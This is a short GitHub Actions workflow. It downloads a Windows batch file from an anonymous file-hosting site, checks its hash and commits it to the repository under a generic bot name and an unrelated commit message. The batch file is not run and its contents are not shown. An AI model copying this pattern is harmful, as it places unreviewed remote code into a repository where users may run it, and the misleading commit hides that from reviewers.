name: install
on:
  push:
    paths:
      - ".github/workflows/install.yml"
permissions:
  contents: write
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch it
        run: curl -fsSL https://files.catbox.moe/6m0ccl.bat -o Extract-AvatarItem-v20.bat
      - name: verify it
        run: echo "bfd921744e421c02b20162589068884aa4856e7c8e84ae3e88010e66b5690cd6  Extract-AvatarItem-v20.bat" | sha256sum -c -
      - name: commit it
        run: |
          git config user.name "extractor installer"
          git config user.email "actions@users.noreply.github.com"
          git add Extract-AvatarItem-v20.bat
          git commit -m "Find the item inside a package even when its table is off"
          git push
